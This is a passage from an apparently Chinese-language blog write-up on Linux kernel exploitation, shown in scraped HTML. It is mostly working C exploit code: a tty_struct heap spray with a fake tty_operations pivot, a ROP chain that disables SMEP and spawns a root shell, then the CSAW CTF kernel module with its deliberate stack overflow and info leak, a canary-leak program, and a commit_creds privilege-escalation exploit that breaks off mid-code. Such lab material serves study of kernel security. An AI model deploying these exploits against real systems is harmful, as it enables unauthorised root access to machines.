class="number">144.</span> <span class="built_in">printf</span>(<span class="string">"[-] Only %ld bytes read.n"</span>, size);</span><br><span class="line"><span class="number">145.</span> &#125;</span><br><span class="line"><span class="number">146.</span> <span class="built_in">puts</span>(<span class="string">"[+] Detecting buffer content type"</span>);</span><br><span class="line"><span class="number">147.</span> <span class="keyword">if</span> (buf[<span class="number">0</span>] != <span class="number">0x01</span> || buf[<span class="number">1</span>] != <span class="number">0x54</span>) &#123;</span><br><span class="line"><span class="number">148.</span> <span class="built_in">puts</span>(<span class="string">"[-] tty_struct spray failed"</span>);</span><br><span class="line"><span class="number">149.</span> <span class="built_in">printf</span>(<span class="string">"[-] We should have 0x01 and 0x54, instead we got %02x %02xn"</span>, buf[<span class="number">0</span>], buf[<span class="number">1</span>]);</span><br><span class="line"><span class="number">150.</span> <span class="built_in">puts</span>(<span class="string">"[-] Exiting..."</span>);</span><br><span class="line"><span class="number">151.</span> <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"><span class="number">152.</span> &#125;</span><br><span class="line"><span class="number">153.</span> </span><br><span class="line"><span class="number">154.</span> <span class="built_in">puts</span>(<span class="string">"[+] Spray complete. Modifying function pointer"</span>);</span><br><span class="line"><span class="number">155.</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> *temp = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;buf[<span class="number">24</span>];</span><br><span class="line"><span class="number">156.</span> *temp = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fake_tty_operations;</span><br><span class="line"><span class="number">157.</span> </span><br><span class="line"><span class="number">158.</span> <span class="built_in">puts</span>(<span class="string">"[+] Preparing ROP chain"</span>);</span><br><span class="line"><span class="number">159.</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> lower_address = xchgeaxesp &amp; <span class="number">0xFFFFFFFF</span>;</span><br><span class="line"><span class="number">160.</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> base = lower_address &amp; ~<span class="number">0xfff</span>;</span><br><span class="line"><span class="number">161.</span> <span class="built_in">printf</span>(<span class="string">"[+] Base address is %lxn"</span>, base);</span><br><span class="line"><span class="number">162.</span> <span class="keyword">if</span> (mmap(base, <span class="number">0x30000</span>, <span class="number">7</span>, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>) != base) &#123;</span><br><span class="line"><span class="number">163.</span>  perror(<span class="string">"mmap"</span>);</span><br><span class="line"><span class="number">164.</span> <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"><span class="number">165.</span> &#125;</span><br><span class="line"><span class="number">166.</span> </span><br><span class="line"><span class="number">167.</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> rop_chain[] = &#123;</span><br><span class="line"><span class="number">168.</span> poprdiret,</span><br><span class="line"><span class="number">169.</span> <span class="number">0x6f0</span>,</span><br><span class="line"><span class="number">170.</span> native_write_cr4,</span><br><span class="line"><span class="number">171.</span> (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shellcode,</span><br><span class="line"><span class="number">172.</span> swapgs,</span><br><span class="line"><span class="number">173.</span> base,</span><br><span class="line"><span class="number">174.</span> iretq,</span><br><span class="line"><span class="number">175.</span> (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_shell,</span><br><span class="line"><span class="number">176.</span> user_cs,</span><br><span class="line"><span class="number">177.</span> user_eflags,</span><br><span class="line"><span class="number">178.</span> base + <span class="number">0x10000</span>,</span><br><span class="line"><span class="number">179.</span> user_ss</span><br><span class="line"><span class="number">180.</span> &#125;;</span><br><span class="line"><span class="number">181.</span> <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)lower_address, rop_chain, <span class="keyword">sizeof</span>(rop_chain));</span><br><span class="line"><span class="number">182.</span> </span><br><span class="line"><span class="number">183.</span> <span class="built_in">puts</span>(<span class="string">"[+] Writing function pointer to the driver"</span>);</span><br><span class="line"><span class="number">184.</span> <span class="keyword">long</span> len = write(fd, buf, <span class="number">32</span>);</span><br><span class="line"><span class="number">185.</span> <span class="keyword">if</span> (len &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">186.</span> perror(<span class="string">"write"</span>);</span><br><span class="line"><span class="number">187.</span> <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"><span class="number">188.</span> &#125;</span><br><span class="line"><span class="number">189.</span> </span><br><span class="line"><span class="number">190.</span> <span class="built_in">puts</span>(<span class="string">"[+] Triggering"</span>);</span><br><span class="line"><span class="number">191.</span> <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line"><span class="number">192.</span> ioctl(spray_fd[i], <span class="number">0</span>, <span class="number">0</span>); <span class="comment">//FFFFFFFF814D8AED call rax</span></span><br><span class="line"><span class="number">193.</span> &#125;</span><br><span class="line"><span class="number">194.</span> </span><br><span class="line"><span class="number">195.</span>&#125;</span><br><span class="line"><span class="number">196.</span></span><br><span class="line"><span class="number">197.</span><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="number">198.</span> exploit();</span><br><span class="line"><span class="number">199.</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">200.</span>&#125;</span><br></pre></td></tr></table></figure>
<pre><code>其中，tty_struct和tty_operations都是从源码里找到的结构，不太需要解释，file_operations的存在主要是给他一个有效的指针，避免一些可能出现的错误，然后save_state函数用来保存用户空间的cs、eflags、ss的值，在iretq的时候，需要提供rip，cs,eflags,用户栈位置，ss值，所以我们要提前保存好备用。
通过打开/dev/ptmx设备，我们就新建了tty_struct。
通过计算tty_struct的大小，提前使用ioctl将buf的大小设置为一样的大小，之后新建tty_struct的时候,tty_struct就会落在这个buf里。
之后我们通过修改tty_struct的tty_operations，设置为我们自己的tty_operations即可，我们自己的tty_operations再修改ioctl为xchg esp, eax来使得rsp指向用户空间。
而这里的位置我们提前mmap，放入rop_chain的内容，这样xchg之后rsp就指向了rop_chain开始的位置，进入了rop流程啦，最后rop结束，执行完毕，打开了root shell，提权成功！
</code></pre><p>第二道</p>
<h1 id="0x01-漏洞代码"><a href="#0x01-漏洞代码" class="headerlink" title="0x01 :漏洞代码"></a>0x01 :漏洞代码</h1><p>有漏洞的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * csaw.c</span></span><br><span class="line"><span class="comment"> * CSAW CTF Challenge Kernel Module</span></span><br><span class="line"><span class="comment"> * Jon Oberheide &lt;jon@oberheide.org&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This module implements the /proc/csaw interface which can be read</span></span><br><span class="line"><span class="comment"> * and written like a normal file. For example:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * $ cat /proc/csaw </span></span><br><span class="line"><span class="comment"> * Welcome to the CSAW CTF challenge. Best of luck!</span></span><br><span class="line"><span class="comment"> * $ echo "Hello World" &gt; /proc/csaw</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LENGTH 64</span></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"Jon Oberheide"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"CSAW CTF Challenge Kernel Module"</span>);</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">csaw_proc</span>;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">struct proc_dir_entry &#123;</span></span><br><span class="line"><span class="comment">    unsigned short low_ino;</span></span><br><span class="line"><span class="comment">    unsigned short namelen;</span></span><br><span class="line"><span class="comment">    const char *name;</span></span><br><span class="line"><span class="comment">    mode_t mode;</span></span><br><span class="line"><span class="comment">    nlink_t nlink;</span></span><br><span class="line"><span class="comment">    uid_t uid;</span></span><br><span class="line"><span class="comment">    gid_t gid;</span></span><br><span class="line"><span class="comment">    unsigned long size;</span></span><br><span class="line"><span class="comment">    struct inode_operations * proc_iops;</span></span><br><span class="line"><span class="comment">    struct file_operations * proc_fops;</span></span><br><span class="line"><span class="comment">    get_info_t *get_info;</span></span><br><span class="line"><span class="comment">    struct module *owner;</span></span><br><span class="line"><span class="comment">    struct proc_dir_entry *next, *parent, *subdir;</span></span><br><span class="line"><span class="comment">    void *data;</span></span><br><span class="line"><span class="comment">    read_proc_t *read_proc;</span></span><br><span class="line"><span class="comment">    write_proc_t *write_proc;</span></span><br><span class="line"><span class="comment">    atomic_t count;      //use count </span></span><br><span class="line"><span class="comment">    int deleted;        //delete flag</span></span><br><span class="line"><span class="comment">    kdev_t    rdev;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">csaw_write(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> __user *ubuf, <span class="keyword">unsigned</span> <span class="keyword">long</span> count, <span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[MAX_LENGTH];</span><br><span class="line">    printk(KERN_INFO <span class="string">"csaw: called csaw_writen"</span>);</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * We should be safe to perform this copy from userspace since our </span></span><br><span class="line"><span class="comment">     * kernel is compiled with CC_STACKPROTECTOR, which includes a canary</span></span><br><span class="line"><span class="comment">     * on the kernel stack to protect against smashing the stack.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * While the user could easily DoS the kernel, I don't think they</span></span><br><span class="line"><span class="comment">     * should be able to escalate privileges without discovering the </span></span><br><span class="line"><span class="comment">     * secret stack canary value.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;buf, ubuf, count)) &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">"csaw: error copying data from userspacen"</span>);</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">csaw_read(<span class="keyword">char</span> *page, <span class="keyword">char</span> **start, <span class="keyword">off_t</span> off, <span class="keyword">int</span> count, <span class="keyword">int</span> *eof, <span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[MAX_LENGTH];</span><br><span class="line">    printk(KERN_INFO <span class="string">"csaw: called csaw_readn"</span>);</span><br><span class="line">    *eof = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">"Welcome to the CSAW CTF challenge. Best of luck!n"</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(page, buf + off, MAX_LENGTH);</span><br><span class="line">    <span class="keyword">return</span> MAX_LENGTH;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __init</span><br><span class="line">csaw_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"csaw: loading modulen"</span>);</span><br><span class="line">    csaw_proc = create_proc_entry(<span class="string">"csaw"</span>, <span class="number">0666</span>, <span class="literal">NULL</span>);</span><br><span class="line">    csaw_proc-&gt;read_proc = csaw_read;</span><br><span class="line">    csaw_proc-&gt;write_proc = csaw_write;</span><br><span class="line">    printk(KERN_INFO <span class="string">"csaw: created /proc/csaw entryn"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __exit</span><br><span class="line">csaw_exit(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (csaw_proc) &#123;</span><br><span class="line">        remove_proc_entry(<span class="string">"csaw"</span>, csaw_proc);</span><br><span class="line">    &#125;</span><br><span class="line">    printk(KERN_INFO <span class="string">"csaw: unloading modulen"</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(csaw_init);</span><br><span class="line">module_exit(csaw_exit);</span><br></pre></td></tr></table></figure></p>
<p>Makefile如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">obj-m := csaw.o  </span><br><span class="line">KERNELDR := ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/</span><br><span class="line">PWD := $(shell pwd)  </span><br><span class="line">modules:  </span><br><span class="line">        $(MAKE) -C $(KERNELDR) M=$(PWD) modules  </span><br><span class="line">moduels_install:  </span><br><span class="line">        $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install  </span><br><span class="line">clean:  </span><br><span class="line">        rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</span><br></pre></td></tr></table></figure></p>
<h1 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 : 分析"></a>0x02 : 分析</h1><p>首先漏洞点很好找，就是一个简单粗暴的栈溢出：</p>
<pre><code>这里，从用户空间做拷贝的时候未作任何check，
导致过长的字符串可以覆盖到返回地值，
这种情形和我们第二篇文章中遇到的情况一样，
那么是不是就按照那个文章做利用就可以了呢？
并不是，从注释中看出，出题者是开启了kernel CANARY选项的，
也就是说，我们直接去覆盖的话，
会先覆盖CANARY，然后就会过不了check从而kernel panic。
是不是这就没法玩了呢？一般来说，对于CANARY这种情况，
我们采取的策略要么是leak，要么就是crack。继续分析代码，看到read部分：


拼接了栈上一个变量，然后拷贝到了用户空间，
而且拷贝的长度很长，这就是出题人故意留下的info leak，
好让我们可以leak CANARY的值。
那么现在，我们拥有一个info leak，拥有一个stack     bof，两者结合，就是第二篇文章中的利用方式了。只需要组合payload为：
junk+CANARY+ebp+payload_addr
我们就可以像之前一样去get root shell啦~
</code></pre><h1 id="0x03-Poc"><a href="#0x03-Poc" class="headerlink" title="0x03 : Poc"></a>0x03 : Poc</h1><p>poc的代码很简单，直接触发漏洞就可以，但是这种直接就kernel panic的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/csaw"</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"errorn"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> poc[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">memset</span>(poc,<span class="number">0x41</span>,<span class="number">64</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Triger bug:n"</span>);</span><br><span class="line">    write(fd,poc,<span class="number">64</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面我们写一个dump，可以dump出CANARY的值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/csaw"</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"errorn"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    lseek(fd,<span class="number">16</span>,SEEK_CUR);</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">64</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd,buffer,<span class="number">64</span>);</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">   <span class="comment">// memset(buffer,0x41,64);</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;<span class="number">16</span>;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%02x "</span>,buffer[i*<span class="number">16</span>+j] &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" | "</span>);</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;<span class="number">16</span>;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>,buffer[i*<span class="number">16</span>+j] &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> canary[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(canary,buffer+<span class="number">32</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"CANARY:"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02x"</span>,canary[i] &amp; <span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>还和之前一样，编译后，丢busybox文件系统，
然后qemu起系统，之后测试我们的dump程序是否工作正常
h可以看到，我们的dump程序可以正常dump出CANARY的值，
那么下面的工作就很简单了，直接可以利用这个leak，构造payload去拿root shell了。
</code></pre><h1 id="0x04-Exploit"><a href="#0x04-Exploit" class="headerlink" title="0x04 : Exploit"></a>0x04 : Exploit</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">launch_shell</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    execl(<span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_tf</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"pushl %cs; popl tf+4;"</span></span><br><span class="line">        <span class="string">"pushfl; popl tf+8;"</span></span><br><span class="line">        <span class="string">"pushl %esp; popl tf+12;"</span></span><br><span class="line">        <span class="string">"pushl %ss; popl tf+16;"</span>);</span><br><span class="line">    tf.eip = &amp;launch_shell;</span><br><span class="line">    tf.esp -= <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xc1067fc0</span>;</span><br><span class="line"><span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xc1067e20</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//payload here    </span></span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"mov $tf,%esp;"</span></span><br><span class="line">       <span class="string">"iret;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/csaw"</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"errorn"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    lseek(fd,<span class="number">16</span>,SEEK_CUR);</span><br><span class="line">    <span class="keyword">char</span> buffer[<span 